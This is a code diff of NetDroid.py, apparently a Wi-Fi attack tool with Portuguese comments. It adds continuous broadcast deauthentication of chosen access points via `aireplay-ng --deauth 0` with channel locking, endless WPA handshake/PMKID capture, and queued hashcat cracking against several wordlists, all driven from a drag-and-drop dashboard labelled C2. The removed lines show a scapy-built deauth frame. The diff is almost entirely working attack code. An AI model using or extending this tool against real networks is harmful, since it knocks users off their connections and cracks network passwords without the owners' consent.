@@ -114,7 +114,7 @@ except Exception:
     HAS_REPORTLAB = False
 
 # ═══════════════════════ CONSTANTS ════════════════════════════
-VERSION = "1.4.0"
+VERSION = "1.5.4"
 GITHUB_RAW_URL = "https://raw.githubusercontent.com/yamotoz/NetDroid/main/NetDroid.py"
 GITHUB_VERSION_URL = "https://raw.githubusercontent.com/yamotoz/NetDroid/main/VERSION"
 HAS_NMAP_BIN = bool(shutil.which("nmap"))
@@ -169,6 +169,7 @@ HAS_HCXDUMPTOOL = bool(shutil.which("hcxdumptool"))
 HAS_HCXPCAPNGTOOL = bool(shutil.which("hcxpcapngtool")) or bool(shutil.which("hcxpcaptool"))
 HAS_HASHCAT  = bool(shutil.which("hashcat"))
 HAS_AIRODUMP = bool(shutil.which("airodump-ng"))
+HAS_AIRCRACK = bool(shutil.which("aircrack-ng"))
 
 # ──────────── Dashboard C2 (--live) constants ───────────────
 DASHBOARD_HOST = "127.0.0.1"
@@ -176,6 +177,29 @@ DASHBOARD_PORT = 5556
 DASHBOARD_SECRET = "netdroid-c2-local"  # local apenas — não exposto à rede
 WORDLIST_DIR = Path("WordList")
 HANDSHAKE_DIR = Path("handshakes")
+PASS_DIR = Path("Pass")              # senhas quebradas (append-only)
+IMPORTS_DIR = Path("imports")        # exports de zonas (PDF + TXT)
+DEAUTH_THREAD_LIMIT = 8              # max threads deauth simultâneas (anti-explosion)
+
+# Tabela canal ↔ frequência 802.11 (preenche '?' automaticamente quando
+# uma fonte traz canal mas não freq, ou vice-versa)
+CHANNEL_TO_FREQ_24 = {n: 2407 + n*5 for n in range(1, 14)}
+CHANNEL_TO_FREQ_24[14] = 2484
+CHANNEL_TO_FREQ_5 = {  # canais 5GHz comuns
+    32:5160, 36:5180, 40:5200, 44:5220, 48:5240, 52:5260, 56:5280,
+    60:5300, 64:5320, 68:5340, 96:5480, 100:5500, 104:5520, 108:5540,
+    112:5560, 116:5580, 120:5600, 124:5620, 128:5640, 132:5660,
+    136:5680, 140:5700, 144:5720, 149:5745, 153:5765, 157:5785,
+    161:5805, 165:5825, 169:5845, 173:5865, 177:5885,
+}
+CHANNEL_TO_FREQ_6 = {1+(n-1)*4: 5950 + n*5 for n in range(1, 60)}  # 6GHz (Wi-Fi 6E)
+CHANNEL_TO_FREQ_ALL = {**CHANNEL_TO_FREQ_24, **CHANNEL_TO_FREQ_5}
+FREQ_TO_CHANNEL_ALL = {v: k for k, v in CHANNEL_TO_FREQ_ALL.items()}
+
+# Captura/scan contínuo
+CONTINUOUS_SCAN_INTERVAL_SEC = 6     # intervalo entre re-leituras do CSV airodump
+CHANNEL_HOP_INTERVAL_MS = 250        # tempo em cada canal antes de pular
+HANDSHAKE_RETRY_FOREVER = True       # nunca desiste de capturar handshake
 HASHCAT_PROFILES = {
     # nome: workload (1-4) + label visível no dashboard
     "low":     {"workload": 1, "runtime": 0, "label": "🟢 LOW — silencioso (~30% GPU)"},
@@ -3578,9 +3602,21 @@ class KamikaseEngine:
         self.zonas_lock = threading.Lock()
         self.deauth_threads: Dict[str, threading.Thread] = {}  # bssid → thread
         self.deauth_stops: Dict[str, threading.Event] = {}     # bssid → stop
+        self.capture_stops: Dict[str, threading.Event] = {}    # bssid → stop captura infinita
+        self.deauth_procs: Dict[str, List[subprocess.Popen]] = {}  # bssid → [aireplay processes]
+        # Semáforo limita threads de deauth simultâneas (anti-explosion)
+        self.deauth_semaforo = threading.BoundedSemaphore(DEAUTH_THREAD_LIMIT)
+        self.monitor_falhou = False  # flag global se setup_monitor falhou
+        self.monitor_ativo = False   # lazy: só ativa quando primeiro AP entra em vermelha/azul
+        self._monitor_lock = threading.Lock()
         self.hashcat_worker: Optional[HashcatWorker] = None
         self.pmkid: Optional[PMKIDCapture] = None
         self.memoria = MemoriaPersistente() if live else None
+        # Scan contínuo de redes
+        self.scan_continuo_ativo = False
+        self.scan_continuo_thread: Optional[threading.Thread] = None
+        self.scan_continuo_stop = threading.Event()
+        self.scan_continuo_profundo = False
 
     # ─── API PÚBLICA ─────────────────────────────────────────
 
@@ -3647,10 +3683,21 @@ class KamikaseEngine:
                                 f"{stats['com_handshake']} com handshake | "
                                 f"{stats['quebradas']} senhas quebradas")
 
-        # Sem consent_duplo no modo live — o dashboard tem aviso visual e drag-drop é deliberado
-        if not await self._descobrir_aps():
-            self.ui.error("Nenhum AP descoberto.")
-            return
+        # Lazy monitor: NÃO ativa airmon-ng aqui. Mantém iface managed para
+        # nmcli funcionar livremente no scan inicial e contínuo. Monitor só
+        # é ativado quando o primeiro AP for movido pra zona vermelha/azul.
+        self.ui.info("ℹ Monitor mode preguiçoso: ativado só quando primeiro "
+                     "AP for movido pra vermelha/azul.")
+
+        # Scan inicial: 3× nmcli sequencial com dedup. Mais confiável que scapy
+        # (scapy frequentemente perde canal/freq).
+        self._scan_inicial_nmcli_triplo()
+        if not self.alvos:
+            # Fallback pro caminho normal se nmcli falhou completamente
+            self.ui.warn("nmcli não retornou APs no boot — tentando descobrir via outros meios…")
+            if not await self._descobrir_aps():
+                self.ui.error("Nenhum AP descoberto.")
+                return
         # Audita cada AP, mescla com memória e popula zona verde
         for ap in self.alvos:
             ap.update(WifiSecurityAuditor.auditar(ap))
@@ -3667,9 +3714,13 @@ class KamikaseEngine:
                 self.zonas["verde"].append(ap["bssid"])
             emitir("ap_descoberto", **ap)
 
-        # Setup monitor mode (só Linux/Termux com --root)
-        if not self._setup_monitor():
-            self.ui.warn("Setup monitor falhou. Algumas operações ficam limitadas.")
+        # NÃO ativa monitor aqui (lazy). Continuous scan rodará em managed
+        # mode usando nmcli — sem channel hopper (não precisa em managed).
+        try:
+            self.iniciar_scan_continuo(profundo=False)
+            self.ui.success("✓ Scan contínuo iniciado (nmcli, managed mode)")
+        except Exception as _e:
+            self.ui.warn(f"Scan contínuo não pôde iniciar: {_e}")
         self._audit_log_inicio()
         self.start_time = time.time()
         # Hashcat worker em standby (com referência à memória pra salvar senha)
@@ -3688,29 +3739,81 @@ class KamikaseEngine:
         finally:
             self._encerrar_limpo()
 
-    def remapear_redes(self) -> Dict[str, Any]:
+    def _scan_inicial_nmcli_triplo(self) -> None:
+        """Roda nmcli 3× sequencial no boot, com pequena pausa entre, mescla
+        e dedupa por BSSID. Resultado é jogado direto em self.alvos. Mais
+        robusto que uma única chamada — captura redes que aparecem/somem
+        entre rescans rápidos. Roda em managed mode (sem monitor)."""
+        self.ui.info("🔍 Scan inicial: nmcli 3× sequencial…")
+        rodadas: List[List[Dict[str, Any]]] = []
+        for i in range(3):
+            try:
+                achados = self._scan_aps_nmcli(timeout_sec=12) or []
+                self.ui.info(f"  rodada {i+1}/3: {len(achados)} APs")
+                rodadas.append(achados)
+            except Exception as e:
+                self.ui.warn(f"  rodada {i+1}/3 falhou: {e}")
+            if i < 2:
+                time.sleep(1.5)
+        # Mescla as 3 rodadas com dedup absoluto
+        mesclados = self._mesclar_aps(*rodadas)
+        self.alvos = mesclados
+        self.ui.success(f"  ✓ {len(self.alvos)} APs únicos após dedup das 3 rodadas")
+
+    def _garantir_monitor_ativo(self) -> bool:
+        """Lazy-activator: liga monitor mode na primeira vez que um AP entra
+        em vermelha/azul. A partir daí, nmcli para de funcionar (esperado).
+        Idempotente — chamadas repetidas após primeira ativação são no-op."""
+        with self._monitor_lock:
+            if self.monitor_ativo:
+                return True
+            self.ui.info("⚙ Ativando monitor mode (primeiro AP em ataque)…")
+            ok = self._setup_monitor()
+            if ok:
+                self.monitor_ativo = True
+                self.ui.success(f"✓ Monitor mode ativo: {self.iface_monitor}")
+                # Agora podemos usar channel hopper de fato
+                try: emitir("monitor_pronto", iface=self.iface_monitor)
+                except Exception: pass
+                # Pausa scan contínuo em nmcli (não funciona em monitor)
+                # mas não para a thread — ela pode tentar e ignorar quando vazio
+            else:
+                self.monitor_falhou = True
+                self.ui.error("✗ Falha ao ativar monitor — ataques ficarão limitados")
+                try: emitir("monitor_failed", iface=self.iface_orig,
+                              motivo="airmon-ng falhou")
+                except Exception: pass
+            return ok
+
+    def remapear_redes(self, scan_profundo: bool = False) -> Dict[str, Any]:
         """Re-escaneia o ambiente WiFi e adiciona SÓ APs novos.
         Não duplica APs já conhecidos. Mescla com memória para
-        restaurar senha/handshake de redes já vistas em outras sessões."""
-        self.ui.info("🔄 Remapeando redes (verificação rápida)...")
+        restaurar senha/handshake de redes já vistas em outras sessões.
+        Se scan_profundo=True, faz múltiplas passagens e maior timeout."""
+        modo = "profundo" if scan_profundo else "rápido"
+        self.ui.info(f"🔄 Remapeando redes (modo {modo})...")
         bssids_atuais = {a["bssid"] for a in self.alvos}
-        # Reusa os scanners por motor (sync, sem asyncio)
+
+        # Scan exclusivamente via nmcli (decisão do usuário em v1.5.3 — scapy
+        # frequentemente perde canal/freq, polui a UI). Se monitor mode estiver
+        # ativo, nmcli volta vazio (esperado) — usuário deve mover APs pra fora
+        # de vermelha/azul antes de re-escanear.
         achados: List[Dict[str, Any]] = []
+        timeout_scan = 20 if scan_profundo else 12
         try:
             if self.ctx.motor == "adm":
-                achados = self._scan_aps_windows()
+                achados = self._scan_aps_windows(timeout_sec=timeout_scan)
             elif self.ctx.motor == "root-kali":
-                achados = self._scan_aps_iw()
+                achados = self._scan_aps_nmcli(timeout_sec=timeout_scan) or []
+                if not achados and self.monitor_ativo:
+                    self.ui.info("  nmcli vazio — esperado em monitor mode. "
+                                 "Use o botão Scapy se quiser scan passivo.")
             elif self.ctx.motor == "root-termux":
-                achados = self._scan_aps_termux()
+                achados = self._scan_aps_termux(timeout_sec=timeout_scan)
         except Exception as e:
-            self.ui.warn(f"  Scan nativo falhou: {e}")
-        if not achados and HAS_SCAPY:
-            try:
-                achados = self._scan_aps_scapy()
-            except Exception:
-                pass
+            self.ui.warn(f"  nmcli falhou: {e}")
 
+        achados = self._mesclar_aps(achados)
         novos_aps: List[Dict[str, Any]] = []
         atualizados = 0
         for ap in achados:
@@ -3721,8 +3824,8 @@ class KamikaseEngine:
                 # Atualiza RSSI e timestamp do AP existente
                 existente = next((a for a in self.alvos if a["bssid"] == bssid), None)
                 if existente:
-                    existente["rssi"] = ap.get("rssi", existente.get("rssi"))
-                    existente["canal"] = ap.get("canal", existente.get("canal"))
+                    existente.update({k: v for k, v in ap.items()
+                                      if v not in (None, "", "?")})
                     if self.memoria:
                         self.memoria.registrar_ap(existente)
                     emitir("ap_update", **existente)
@@ -3755,11 +3858,106 @@ class KamikaseEngine:
                         f"{atualizados} atualizadas | total {resumo['total']}")
         return resumo
 
+    def iniciar_scan_continuo(self, profundo: bool = False):
+        """Inicia uma thread de scan contínuo de redes."""
+        if self.scan_continuo_ativo:
+            return
+        self.scan_continuo_ativo = True
+        self.scan_continuo_profundo = profundo
+        self.scan_continuo_stop.clear()
+        self.scan_continuo_thread = threading.Thread(
+            target=self._loop_scan_continuo,
+            daemon=True,
+            name="scan-continuo"
+        )
+        self.scan_continuo_thread.start()
+        # Channel hopper paralelo — varre 2.4GHz e 5GHz pra scapy/iw verem todos os canais
+        try:
+            self.channel_hopper_thread = threading.Thread(
+                target=self._loop_channel_hopper,
+                daemon=True,
+                name="chan-hopper"
+            )
+            self.channel_hopper_thread.start()
+        except Exception:
+            pass
+        self.ui.info(f"▶ Scan contínuo iniciado ({'profundo' if profundo else 'rápido'}) + channel hopping")
+        emitir("scan_continuo_status", ativo=True, modo="profundo" if profundo else "rápido")
+
+    def parar_scan_continuo(self):
+        """Para o scan contínuo de redes."""
+        if not self.scan_continuo_ativo:
+            return
+        self.scan_continuo_ativo = False
+        self.scan_continuo_stop.set()
+        if self.scan_continuo_thread and self.scan_continuo_thread.is_alive():
+            self.scan_continuo_thread.join(timeout=2)
+        self.ui.info("⏹ Scan contínuo parado")
+        emitir("scan_continuo_status", ativo=False)
+
+    def _loop_scan_continuo(self):
+        """Loop interno de scan contínuo. Executa scans periodicamente."""
+        ciclo = 0
+        while not self.scan_continuo_stop.is_set():
+            ciclo += 1
+            try:
+                # Alterna entre scan normal e profundo a cada 3 ciclos se profundo=True
+                usar_profundo = self.scan_continuo_profundo and (ciclo % 3 == 0)
+                self.remapear_redes(scan_profundo=usar_profundo)
+            except Exception as e:
+                self.ui.warn(f"Erro no scan cíclico #{ciclo}: {e}")
+            # Intervalo configurável entre scans
+            if self.scan_continuo_stop.wait(float(CONTINUOUS_SCAN_INTERVAL_SEC)):
+                break
+
+    def _loop_channel_hopper(self):
+        """Roda em paralelo ao scan contínuo: muda o canal da iface monitor
+        a cada CHANNEL_HOP_INTERVAL_MS para que scanners passivos (scapy/iw)
+        consigam ver redes em TODOS os canais 2.4GHz + 5GHz comuns. Sem isto
+        a placa fica travada num único canal e o scan vê apenas ~25% das redes."""
+        if not HAS_IW:
+            return
+        iface = self.iface_monitor or self.iface_orig
+        if not iface:
+            return
+        canais = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13,
+                  36, 40, 44, 48, 52, 56, 60, 64,
+                  100, 104, 108, 112, 116, 120, 124, 128,
+                  132, 136, 140, 149, 153, 157, 161, 165]
+        idx = 0
+        intervalo_s = max(0.05, CHANNEL_HOP_INTERVAL_MS / 1000.0)
+        while not self.scan_continuo_stop.is_set():
+            # Sem monitor ativo, não há iface monitor pra mexer
+            if not self.monitor_ativo or not self.iface_monitor:
+                if self.scan_continuo_stop.wait(2.0):
+                    break
+                continue
+            # Se há captura de handshake em andamento (zona azul) OU deauth
+            # ativo (zona vermelha), o canal da iface está travado no AP-alvo.
+            # Não pular canal — senão airodump/aireplay perdem o canal.
+            if self.capture_stops or self.deauth_procs:
+                if self.scan_continuo_stop.wait(1.0):
+                    break
+                continue
+            canal = canais[idx % len(canais)]
+            idx += 1
+            try:
+                subprocess.run(["iw", "dev", iface, "set", "channel", str(canal)],
+                               timeout=2, check=False,
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except Exception:
+                # canal fora da regulatory domain — pula silenciosamente
+                pass
+            if self.scan_continuo_stop.wait(intervalo_s):
+                break
+
     def mover_para_zona(self, bssid: str, destino: str,
                           perfil: str = "low", wordlist: Optional[str] = None,
-                          contextual: bool = True):
+                          wordlists: Optional[List[str]] = None,
+                          contextual: bool = True, stop_on_crack: bool = True):
         """Chamado pelo dashboard via WebSocket quando o usuário arrasta
-        um AP entre zonas. Dispara/encerra ataque deauth ou crack queue."""
+        um AP entre zonas. Dispara/encerra ataque deauth ou crack queue.
+        Suporta wordlist única (legado) ou wordlists (array para fila sequencial)."""
         # Localiza AP e remove de qualquer zona atual
         with self.zonas_lock:
             origem = ""
@@ -3774,27 +3972,63 @@ class KamikaseEngine:
         if not ap:
             return
 
+        # ─── cancela captura infinita se saiu da zona azul ───
+        if origem == "azul" and destino != "azul":
+            ev_cap = getattr(self, "capture_stops", {}).get(bssid)
+            if ev_cap:
+                ev_cap.set()
+                self.capture_stops.pop(bssid, None)
+                self.ui.info(f"Captura infinita cancelada para {bssid}")
+
         # ─── encerra deauth se saiu da zona vermelha ───
         if origem == "vermelha" and bssid in self.deauth_stops:
             self.deauth_stops[bssid].set()
+            # Aguarda thread terminar antes de remover do dict (B7: race condition)
+            t_existente = self.deauth_threads.get(bssid)
+            if t_existente:
+                t_existente.join(timeout=1.0)
             self.deauth_stops.pop(bssid, None)
             self.deauth_threads.pop(bssid, None)
             self.ui.info(f"Deauth encerrado para {bssid}")
 
         # ─── inicia deauth se entrou na zona vermelha ───
         if destino == "vermelha":
-            stop = threading.Event()
-            self.deauth_stops[bssid] = stop
-            t = threading.Thread(target=self._loop_deauth_zona,
-                                  args=(bssid, stop), daemon=True,
-                                  name=f"deauth-{bssid}")
-            t.start()
-            self.deauth_threads[bssid] = t
-            self.ui.warn(f"⚡ Deauth iniciado em {bssid} (1 pkt / 0.5s)")
+            # Lazy: ativa monitor mode na primeira vez que algum AP entra
+            # em vermelha ou azul.
+            if not self._garantir_monitor_ativo():
+                ap["crack"] = ap.get("crack") or {}
+                ap["monitor_failed"] = True
+                ap["monitor_aviso"] = ("Falha ao ativar monitor mode. Verifique "
+                                        "driver da placa WiFi e airmon-ng.")
+                emitir("monitor_failed", bssid=bssid, motivo=ap["monitor_aviso"])
+                self.ui.error(f"⚠ {bssid}: monitor mode falhou — deauth abortado.")
+            else:
+                stop = threading.Event()
+                self.deauth_stops[bssid] = stop
+                t = threading.Thread(target=self._loop_deauth_zona,
+                                      args=(bssid, stop), daemon=True,
+                                      name=f"deauth-{bssid}")
+                t.start()
+                self.deauth_threads[bssid] = t
+                canal_aviso = ap.get("canal", "?")
+                self.ui.warn(f"⚡ Deauth contínuo iniciado em {bssid} "
+                              f"(canal {canal_aviso}, broadcast --deauth 0)")
 
         # ─── enfileira hashcat se entrou na zona azul ───
         if destino == "azul" and self.hashcat_worker:
-            self._iniciar_crack_async(ap, perfil, wordlist, contextual)
+            # Lazy monitor também
+            if not self._garantir_monitor_ativo():
+                ap["crack"] = {"status": "monitor_failed",
+                                "erro": "monitor mode falhou", "progresso": 0.0,
+                                "eta": "?"}
+                emitir("ap_update", **ap)
+                self.ui.error(f"⚠ {bssid}: monitor mode falhou — captura abortada.")
+            else:
+                # Atualiza pmkid com a iface monitor recém-ativada
+                if self.pmkid:
+                    self.pmkid.iface = self.iface_monitor or self.iface_orig
+                wls = wordlists if wordlists else ([wordlist] if wordlist else [])
+                self._iniciar_crack_async(ap, perfil, wls, contextual, stop_on_crack)
 
         # Persiste movimentação na memória
         if self.memoria:
@@ -3803,60 +4037,163 @@ class KamikaseEngine:
         emitir("ap_update", **ap)
 
     def _loop_deauth_zona(self, bssid: str, stop_event: threading.Event):
-        """Envia 1 frame deauth a cada 0.5s para o BSSID, infinitamente."""
+        """Estratégia cirúrgica de deauth (v1.5.3):
+
+          1) Trava o canal da iface monitor no canal do AP (essencial).
+          2) Sobe `aireplay-ng --deauth 0 -a <BSSID> <iface>` ÚNICO, infinito.
+             aireplay sozinho envia ~64 deauths broadcast a cada segundo —
+             muito mais agressivo que o loop antigo (1 pkt / 200ms).
+          3) Thread só monitora: se aireplay morrer, reinicia. Atualiza contador
+             aproximado (+64/s) emitindo `ap_update`.
+          4) On stop_event: termina aireplay limpo.
+
+        Sem `-c` (cliente) — broadcast pra rede inteira, foco no roteador."""
+        adquirido = False
+        proc: Optional[subprocess.Popen] = None
         try:
+            adquirido = self.deauth_semaforo.acquire(timeout=5.0)
+            if not adquirido:
+                self.ui.warn(f"  Deauth {bssid}: limite de {DEAUTH_THREAD_LIMIT} threads, pulando.")
+                return
+            if not (HAS_AIREPLAY and self.iface_monitor):
+                self.ui.error(f"  Deauth {bssid}: aireplay-ng ou monitor mode ausentes.")
+                return
+
+            ap0 = next((a for a in self.alvos if a["bssid"] == bssid), None)
+            canal = int(ap0.get("canal", 0)) if ap0 and ap0.get("canal") not in (None, "?", "") else 0
+
+            # 1) Trava canal — CRÍTICO. Sem o canal certo, aireplay manda
+            # frames pra um canal vazio e nada acontece na rede-alvo.
+            if canal and HAS_IW:
+                try:
+                    subprocess.run(["iw", "dev", self.iface_monitor, "set", "channel", str(canal)],
+                                    timeout=3, check=False,
+                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    self.ui.info(f"  Canal {canal} travado em {self.iface_monitor}")
+                except Exception:
+                    pass
+            elif not canal:
+                self.ui.warn(f"  ⚠ {bssid}: canal desconhecido — deauth pode "
+                              "ser placebo. Use NMCLI antes de mover pra vermelha.")
+                if ap0:
+                    ap0["deauth_aviso"] = "canal desconhecido — re-scan via NMCLI"
+                    emitir("ap_update", **ap0)
+
+            self.deauth_procs.setdefault(bssid, [])
+            inicio = time.time()
             while not stop_event.is_set():
-                ok = False
-                # Preferência: aireplay-ng -0 1
-                if HAS_AIREPLAY and self.iface_monitor:
+                # 2) Sobe aireplay --deauth 0 (infinito) se não estiver vivo
+                if proc is None or proc.poll() is not None:
+                    cmd = ["aireplay-ng", "--deauth", "0",
+                           "--ignore-negative-one",
+                           "-a", bssid, self.iface_monitor]
+                    if self.ctx.motor == "root-termux":
+                        cmd = ["su", "-c", " ".join(cmd)]
                     try:
-                        cmd = ["aireplay-ng", "-0", "1", "-a", bssid, self.iface_monitor]
-                        if self.ctx.motor == "root-termux":
-                            cmd = ["su", "-c", " ".join(cmd)]
-                        subprocess.run(cmd, timeout=2,
-                                       stdout=subprocess.DEVNULL,
-                                       stderr=subprocess.DEVNULL)
-                        ok = True
-                    except Exception:
-                        ok = False
-                # Fallback scapy
-                if not ok and HAS_SCAPY and self.iface_monitor:
-                    try:
-                        from scapy.all import RadioTap as _RT, Dot11 as _D11, Dot11Deauth as _DD, sendp as _sendp
-                        pkt = _RT()/_D11(addr1="ff:ff:ff:ff:ff:ff",
-                                          addr2=bssid, addr3=bssid)/_DD(reason=7)
-                        _sendp(pkt, iface=self.iface_monitor, count=1, verbose=False)
-                        ok = True
-                    except Exception:
-                        pass
-                if ok:
-                    with self.contador_lock:
-                        self.contador_global += 1
-                        self.contador_por_bssid[bssid] += 1
-                    # Atualiza AP com contador atualizado
-                    ap = next((a for a in self.alvos if a["bssid"] == bssid), None)
-                    if ap:
-                        ap["pacotes"] = self.contador_por_bssid[bssid]
-                        emitir("ap_update", **ap)
-                if stop_event.wait(0.5):
+                        proc = subprocess.Popen(cmd,
+                                                 stdout=subprocess.DEVNULL,
+                                                 stderr=subprocess.DEVNULL)
+                        self.deauth_procs[bssid] = [proc]
+                        self.ui.warn(f"  ⚡ aireplay --deauth 0 PID={proc.pid} → {bssid}")
+                    except Exception as e:
+                        self.ui.error(f"  aireplay falhou: {e}")
+                        if stop_event.wait(2.0):
+                            break
+                        continue
+                # 3) Atualiza contador aproximado: aireplay envia ~64 pkts/s
+                if stop_event.wait(1.0):
                     break
+                with self.contador_lock:
+                    self.contador_global += 64
+                    self.contador_por_bssid[bssid] = self.contador_por_bssid.get(bssid, 0) + 64
+                ap = next((a for a in self.alvos if a["bssid"] == bssid), None)
+                if ap:
+                    ap["pacotes"] = self.contador_por_bssid[bssid]
+                    ap["deauth_uptime_s"] = int(time.time() - inicio)
+                    emitir("ap_update", **ap)
         except Exception as e:
             self.ui.warn(f"Loop deauth {bssid} caiu: {e}")
+        finally:
+            # 4) Termina aireplay limpo
+            if proc and proc.poll() is None:
+                try: proc.terminate()
+                except Exception: pass
+                try: proc.wait(timeout=2)
+                except Exception:
+                    try: proc.kill()
+                    except Exception: pass
+            self.deauth_procs.pop(bssid, None)
+            if adquirido:
+                try: self.deauth_semaforo.release()
+                except Exception: pass
 
     def _iniciar_crack_async(self, ap: Dict[str, Any], perfil: str,
-                              wordlist: Optional[str], contextual: bool = True):
-        """Captura PMKID/handshake do AP e enfileira no hashcat."""
+                              wordlists: List[str], contextual: bool = True,
+                              stop_on_crack: bool = True):
+        """Captura PMKID/handshake do AP e enfileira no hashcat com múltiplas wordlists."""
         bssid = ap["bssid"]
+        wl_validas = []
+        for wl in wordlists or []:
+            wl_path = Path(wl)
+            if not wl_path.is_absolute():
+                wl_path = WORDLIST_DIR / wl_path.name
+            if wl_path.exists():
+                wl_validas.append(str(wl_path))
+        if not wl_validas:
+            ap["crack"] = {
+                "status": "wordlist_missing",
+                "erro": "Selecione ao menos uma wordlist valida em ./WordList/",
+                "progresso": 0.0,
+                "eta": "?",
+            }
+            emitir("ap_update", **ap)
+            self.ui.warn(f"Crack de {bssid} cancelado: nenhuma wordlist valida.")
+            return
+        ap["crack"] = {"status": "capture_queued", "progresso": 0.0, "eta": "?"}
+        emitir("ap_update", **ap)
         self.ui.info(f"🎯 Capturando handshake de {bssid} para crack...")
 
+        # Stop event por-AP para captura infinita ser cancelável (ao sair da zona azul)
+        if not hasattr(self, "capture_stops"):
+            self.capture_stops = {}
+        # Se já existe captura em andamento, cancela antes de iniciar nova
+        ev_existente = self.capture_stops.get(bssid)
+        if ev_existente:
+            ev_existente.set()
+        capture_stop = threading.Event()
+        self.capture_stops[bssid] = capture_stop
+
         def _worker():
-            ap["crack"] = {"status": "capturing", "progresso": 0.0}
+            ap["crack"] = {"status": "capturing", "progresso": 0.0, "eta": "?",
+                            "tentativa": 0, "estrategia": 0}
             emitir("ap_update", **ap)
-            pcap = self.pmkid.capturar(bssid, ap.get("canal", 0)) if self.pmkid else None
-            if not pcap:
-                ap["crack"] = {"status": "error", "erro": "captura falhou", "progresso": 0.0}
+            def _on_tentativa(estrategia, n):
+                ap["crack"] = {"status": "capturing", "progresso": 0.0, "eta": "?",
+                                "tentativa": n, "estrategia": estrategia}
+                try: emitir("handshake_tentativa", bssid=bssid,
+                              estrategia=estrategia, tentativa=n)
+                except Exception: pass
                 emitir("ap_update", **ap)
+            try:
+                pcap = (self.pmkid.capturar_infinito(bssid, ap.get("canal", 0) or 0,
+                                                       stop_event=capture_stop,
+                                                       on_tentativa=_on_tentativa)
+                          if self.pmkid else None)
+            except Exception as e:
+                self.ui.warn(f"capturar_infinito propagou ({type(e).__name__}): {e}")
+                pcap = None
+            if not pcap:
+                if capture_stop.is_set():
+                    ap["crack"] = {"status": "capture_cancelled", "progresso": 0.0, "eta": "?"}
+                else:
+                    ap["crack"] = {"status": "capture_failed",
+                                    "erro": "captura cancelada/falhou", "progresso": 0.0, "eta": "?"}
+                emitir("ap_update", **ap)
+                self.capture_stops.pop(bssid, None)
                 return
+            try: emitir("handshake_capturado", bssid=bssid, pcap=str(pcap))
+            except Exception: pass
+            self.capture_stops.pop(bssid, None)
             # Persiste handshake na memória local (./memoria/handshakes/)
             if self.memoria:
                 pcap_persistido = self.memoria.registrar_handshake(
@@ -3865,16 +4202,110 @@ class KamikaseEngine:
                 ap["handshake_em"] = datetime.now().isoformat()
                 pcap = pcap_persistido
             self.ui.success(f"  Handshake/PMKID capturado: {pcap}")
-            wl_path = Path(wordlist) if wordlist else None
-            if wl_path and not wl_path.is_absolute():
-                wl_path = WORDLIST_DIR / wl_path.name
+            # Converte wordlists para Path objects
+            wl_paths = []
+            for wl in wl_validas:
+                wl_path = Path(wl)
+                if not wl_path.is_absolute():
+                    wl_path = WORDLIST_DIR / wl_path.name
+                if wl_path.exists():
+                    wl_paths.append(wl_path)
+            ap["crack"] = {"status": "queued", "progresso": 0.0, "eta": "?", "wordlists": [p.name for p in wl_paths]}
+            emitir("ap_update", **ap)
             self.hashcat_worker.enfileirar(
                 bssid=bssid, essid=ap.get("essid", ""),
-                pcapng=pcap, perfil=perfil, wordlist=wl_path,
-                contextual=contextual)
+                pcapng=pcap, perfil=perfil, wordlists=wl_paths,
+                contextual=contextual, stop_on_crack=stop_on_crack)
 
         threading.Thread(target=_worker, daemon=True,
                           name=f"capture-{bssid}").start()
+
+    def reset_deauth(self, bssid: str):
+        """Reinicia o ataque de deauth para um BSSID específico."""
+        # Para deauth existente se houver
+        if bssid in self.deauth_stops:
+            self.deauth_stops[bssid].set()
+            self.deauth_stops.pop(bssid, None)
+            self.deauth_threads.pop(bssid, None)
+            time.sleep(0.1)  # Pequena pausa para encerramento limpo
+        # Reinicia contador
+        with self.contador_lock:
+            self.contador_por_bssid[bssid] = 0
+        # Recria thread de deauth
+        stop = threading.Event()
+        self.deauth_stops[bssid] = stop
+        t = threading.Thread(target=self._loop_deauth_zona,
+                              args=(bssid, stop), daemon=True,
+                              name=f"deauth-{bssid}-reset")
+        t.start()
+        self.deauth_threads[bssid] = t
+        self.ui.warn(f"↻ Deauth reiniciado para {bssid}")
+        # Atualiza AP
+        ap = next((a for a in self.alvos if a["bssid"] == bssid), None)
+        if ap:
+            ap["pacotes"] = 0
+            emitir("ap_update", **ap)
+
+    def recapturar_handshake(self, bssid: str):
+        """Cancela captura em andamento e refaz do zero. Usado pelo botão
+        '🔄 Recapturar handshake' do dashboard. Idempotente."""
+        ap = next((a for a in self.alvos if a["bssid"] == bssid), None)
+        if not ap:
+            self.ui.warn(f"recapturar_handshake: BSSID {bssid} não encontrado")
+            return
+        # Cancela captura atual se existir
+        ev = self.capture_stops.get(bssid)
+        if ev:
+            ev.set()
+            self.ui.info(f"  Captura anterior de {bssid} cancelada")
+            time.sleep(0.5)  # tempo pro loop antigo sair limpo
+            self.capture_stops.pop(bssid, None)
+        # Cancela job hashcat se ja foi enfileirado
+        if self.hashcat_worker:
+            try: self.hashcat_worker.cancelar(bssid)
+            except Exception: pass
+        # Limpa estado de handshake/crack anterior
+        ap.pop("handshake_path", None)
+        ap.pop("handshake_em", None)
+        ap["crack"] = {"status": "capturing", "progresso": 0.0, "eta": "?",
+                        "tentativa": 0, "estrategia": 0}
+        emitir("ap_update", **ap)
+        # Re-dispara pipeline completo. Reusa wordlists já configuradas no AP
+        # (via memória/modal "configurar"). Se nada, lista vazia → modal vai
+        # pedir ao usuário.
+        wls = ap.get("crack_wordlists") or []
+        self._iniciar_crack_async(ap, ap.get("crack_perfil", "low"),
+                                    wls, contextual=True)
+        self.ui.info(f"🔄 Recaptura disparada para {bssid}")
+
+    def reset_crack(self, bssid: str, recapturar: bool = False):
+        """Reinicia o crack de um AP. Se recapturar=True, recaptura handshake primeiro."""
+        ap = next((a for a in self.alvos if a["bssid"] == bssid), None)
+        if not ap:
+            return
+        # Cancela job atual se existir
+        if self.hashcat_worker:
+            self.hashcat_worker.cancelar(bssid)
+        # Limpa estado anterior
+        ap["crack"] = {"status": "resetting", "progresso": 0.0}
+        emitir("ap_update", **ap)
+        if recapturar:
+            # Remove handshake anterior
+            if ap.get("handshake_path"):
+                ap.pop("handshake_path", None)
+                ap.pop("handshake_em", None)
+            self.ui.info(f"↻ Recapturando handshake de {bssid}...")
+            # Reinicia pipeline completo
+            self._iniciar_crack_async(ap, "low", [], contextual=True)
+        else:
+            self.ui.info(f"↻ Crack reiniciado para {bssid} (usando handshake existente)")
+            # Reenfileira com handshake existente se houver
+            if ap.get("handshake_path"):
